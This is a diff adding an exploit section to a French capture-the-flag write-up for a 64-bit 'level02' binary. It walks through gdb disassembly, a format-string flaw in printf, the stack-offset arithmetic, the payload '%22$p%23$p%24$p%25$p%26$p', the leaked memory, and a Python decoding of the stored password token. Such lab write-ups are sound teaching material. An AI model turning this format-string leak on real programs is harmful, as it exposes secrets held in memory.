@@ -34,7 +34,7 @@ test does not have access!
 Dump of assembler code for function main:
    0x0000000000400814 <+0>:	push   rbp
    0x0000000000400815 <+1>:	mov    rbp,rsp
-   0x0000000000400818 <+4>:	sub    rsp,0x120
+   0x0000000000400818 <+4>:	sub    rsp,0x120                        ; 120 octets pout la stack
    0x000000000040081f <+11>:	mov    DWORD PTR [rbp-0x114],edi      ; argc
    0x0000000000400825 <+17>:	mov    QWORD PTR [rbp-0x120],rsi      ; argv
    0x000000000040082c <+24>:	lea    rdx,[rbp-0x70]                 ; buffer_a  @ rbp - 0x70
@@ -164,7 +164,7 @@ Dump of assembler code for function main:
    0x0000000000400a60 <+588>:	mov    rdi,rax
    0x0000000000400a63 <+591>:	call   0x400670 <strncmp@plt>
    0x0000000000400a68 <+596>:	test   eax,eax
-   0x0000000000400a6a <+598>:	jne    0x400a96 <main+642>            ; if strncmp(buffer_b, buffer_c) != 0:  jump <+642>
+   0x0000000000400a6a <+598>:	jne    0x400a96 <main+642>            ; if strncmp(buffer_b, buffer_c, 41) != 0:  jump <+642>
    0x0000000000400a6c <+600>:	mov    eax,0x400d22
    0x0000000000400a71 <+605>:	lea    rdx,[rbp-0x70]
    0x0000000000400a75 <+609>:	mov    rsi,rdx
@@ -188,3 +188,40 @@ End of assembler dump.
 ```
 C'est un binaire 64bits, donc la 'calling convention' est différente d'un binaire 32 bits: on passe les arguments par les registres et non par la stack. (cf. "A.2.1 Calling Conventions", p.123 de la [documentation](https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.99.pdf)).
 # Exploit
+
+Le programme attend en input un nom d'utilisateur et un mot de passe, compare le mot de passe avec le contenu du fichier .pass et nous ouvre un shell s'ils sont égaux. Dommage, en passant par gdb on n'a pas les droits pour ouvrir le fichier .pass donc on n'atteint pas la condition.
+
+Par contre, printf à <+654> est vulnérable à un [exploit format string](https://axcheron.github.io/exploit-101-format-strings/) puisqu'il prend uniquement en paramètre le username que nous contrôlons.
+On devrait pouvoir afficher ainsi le contenu du fichier .pass qui se trouve sur la stack.
+Puisque c'est un binaire 64bits, printf va lire les arguments sur la stack tous les 8 octets et nous savons que le token fait 40 caractères.
+Nous allons donc devoir demander 40 / 8 = 5 paramètres à printf pour afficher complètement notre token, reste à savoir à partir de combien de paramètres !
+
+- La stack fait 0x120 = 288 octets
+- Le buffer qui nous intéresse se situe à rbp - 0xa0 (160) = rsp + 128
+- On devrait tomber sur la zone de la stack qui nous intéresse au 16ème argument (128 / 8)
+- Cependant, selon la documentation mentionnée plus haut
+  > User-level applications use as integer registers for passing the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9
+  - printf va donc d'abord chercher ses arguments parmi ces registres avant d'aller les chercher sur la stack !
+
+Notre token devrait donc être affiché par printf à partir du 22ème argument (128 / 8 + les 6 registres)
+
+`./level02`
+```
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %22$p%23$p%24$p%25$p%26$p
+--[ Password:
+*****************************************
+0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!
+```
+
+Pour finalement décoder notre pass, il faut décoder chaque adresse en ascii et la reverse à cause du boutisme (endianness, [oui oui on dit boutisme en français](https://fr.wikipedia.org/wiki/Boutisme) 😂).
+
+`python`
+- `str = "0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d"`
+- `''.join([addr.decode('hex')[::-1] for addr in str.split("0x")])`
+  ```
+  Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+  ```
